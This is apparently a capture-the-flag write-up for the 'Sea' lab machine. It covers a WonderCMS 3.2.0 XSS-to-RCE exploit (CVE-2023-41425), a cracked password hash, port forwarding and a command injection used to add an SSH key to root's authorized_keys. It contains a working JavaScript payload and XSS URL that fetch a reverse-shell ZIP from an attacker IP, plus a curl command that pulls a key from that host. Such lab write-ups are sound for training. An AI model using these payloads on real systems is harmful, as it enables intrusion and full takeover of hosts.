Main steps
1. Fuzz directories to find a license and version file
2. Search information in the files to find CMS
3. Locate public exploit for CMS
4. Gain access as `www-data`
5. Check CMS database file for credentials
6. Pivot to user with credentials
7. Enumerate network ports to find internal server
8. Port forward internal server 
9. Enumerate application to find command injection vulnerability
10. Upload public key to root `authorized_keys` for root SSH access

Learning points
1. Check if hashes have any escaped characters
2. URL encoding - if a string has `+` signs it will be treated as a space

`nmap`
![[Pasted image 20260316164644.png]]

Ports 22, 80 open

Navigating to the webpage shows a mostly static site with a few links. The `contact` link sends me to `sea.htb/contact.php`, so I added this domain name to my `/etc/hosts` file.
![[Pasted image 20260316165127.png]]

The `contact.php` page contains a form with a few input fields.
![[Pasted image 20260316165202.png]]

`Feroxbuster` and `ffuf` do not return anything interesting, other than some license files for the website's theme, and a version number `3.2.0`

On the main page, there is an animated banner with the text `velik71`. Googling this string gives some information -  https://github.com/robiso/bike, which is an animated bike theme for `WonderCMS`, and the same theme that the site is using.
![[Pasted image 20260316171102.png]]

The GitHub page contains the same files I saw from `Feroxbuster`. Since the version number is `3.2.0`, I searched for `WonderCMS 3.2.0` and found an authenticated RCE exploit CVE-2023-41425. There are different versions of the exploit that either require a login session or not - however, both require the `WonderCMS` login page URL.

Checked the default `WonderCMS` login page at `/loginURL` and found it.
![[Pasted image 20260316172154.png]]

Downloaded a POC from https://github.com/prodigiousMind/CVE-2023-41425 to try it out. However, this POC requires an admin user to access the CMS dashboard and click on a malicious generated link, so it may not work.

Ran the script and it generated a link to be sent to the admin.
![[Pasted image 20260316173348.png]]

Since the only way to input anything is from the `contact.php` form, I tried uploading this link there.
![[Pasted image 20260316173433.png]]

The server makes a request to the HTTP server that was started to download the `xss.js` file, but I did not receive a reverse shell.

Looking at the code, the payload seems to try to download a file from `https://github.com/prodigiousMind/revshell/archive/refs/heads/main.zip`. Checking this file shows that it is a simple PHP reverse shell (the one from Pentestmonkey), but the IP address and port number inside are the default values.

Downloaded this ZIP file and edited the values, then rezipped it in my own web server, and updated the script to point to my machine.
![[Pasted image 20260316174824.png]]

Rewrote the `xss.js` file as it did not seem to work properly. (Could be due to running two HTTP servers on my machine) The code below is the important bit, where the token is grabbed, then a request is made to my web server to download the theme ZIP file containing the PHP reverse shell code.
```
var token = document.querySelectorAll('[name="token"]')[0].value;
var urlRev = "/?installModule=http://10.10.14.67/main.zip&directoryName=violet&type=themes&token=" + token;
var xhr = new XMLHttpRequest();
xhr.withCredentials = true;
xhr.open("GET", urlRev);
xhr.send();
```

Updated the XSS script as well to `http://sea.htb/index.php?page=loginURL?"></form><script+src="http://10.10.14.67/xss.js"></script><form+action="` then submitted it again, and saw that the remote server was making requests to download the ZIP file on my web server.
![[Pasted image 20260316175743.png]]

Navigated to `/themes/revshell-main/rev.php` and got a reverse shell as `www-data`.
![[Pasted image 20260316175810.png]]

Checking the `/etc/passwd` file shows two users, `amay` and `geo`.
Checked the database file for `WonderCMS` at `database.js` and found a hashed password.
![[Pasted image 20260316180050.png]]

The backslashes are there to escape the forward slashes, so they are removed before cracking the hash.
` $2y$10$iOrk210RQSAzNCx6Vyq2X.aJ/D.GuE4jRIikYiWrD3TM/PjDnXm4q `

`Hashcat` cracked the hash, which was ` mychemicalromance `.
![[Pasted image 20260316180507.png]]

Tried the password against both users and managed to get access as `amay`, who has the user flag.
![[Pasted image 20260316180610.png]]

`sudo -l` and `SUID` binaries both return nothing interesting, and there are no `cron` jobs.
Checking `ss -ntplu` shows two services running on localhost: 8080 and 53959.
![[Pasted image 20260317150343.png]]

Tried to connect to them with `nc` but they returned no data.

Since there does not seem to be anything else on the machine, I tried to port forward the `localhost:8080` to my machine. Connecting to the port shows me a HTTP authentication screen, which `amay`'s credentials worked for.
![[Pasted image 20260317150927.png]]

Of the options here, the `Analyze Log File` seems the most interesting since it includes a file from the server. Currently there are only two options - the `auth.log` and `access.log`, but I tried intercepting the POST request with `Burpsuite` and editing the file name in the parameter.
![[Pasted image 20260317152001.png]]

Tried including `/etc/password` and was able to.
![[Pasted image 20260317152020.png]]

However, it does not seem to return the entire file. Most likely it's doing some check in the background for the `Suspicious traffic patterns`, then only printing those lines. Since it could be using `grep` or something similar, this may be vulnerable to command injection.

Tried chaining `id` and `whoami` using a semicolon, but was unable to get any output, so I reasoned that whatever command is truncating the output may be coming after the injection point. Instead, I tried sending a `wget` request to my webserver, and saw the request come through.
![[Pasted image 20260317153111.png]]
![[Pasted image 20260317153118.png]]

This confirms the command injection vulnerability.

Tried to spawn a reverse shell but it exits almost immediately.
![[Pasted image 20260317153523.png]]

Running `ls` on the root directory shows that there is a `.ssh` folder. I can try to upload an SSH key here to get access via SSH.

Tried simply echoing the key into the `authorized_keys` file.
![[Pasted image 20260317153917.png]]

This did not work, but on closer inspection there are `+` signs in the public key which the request was treating as spaces, causing the string to be broken up in the `authorized_keys` file.

Used `curl 10.10.14.67/key >> /root/.ssh/authorized_keys` instead and was able to get SSH access as root.
![[Pasted image 20260317154440.png]]

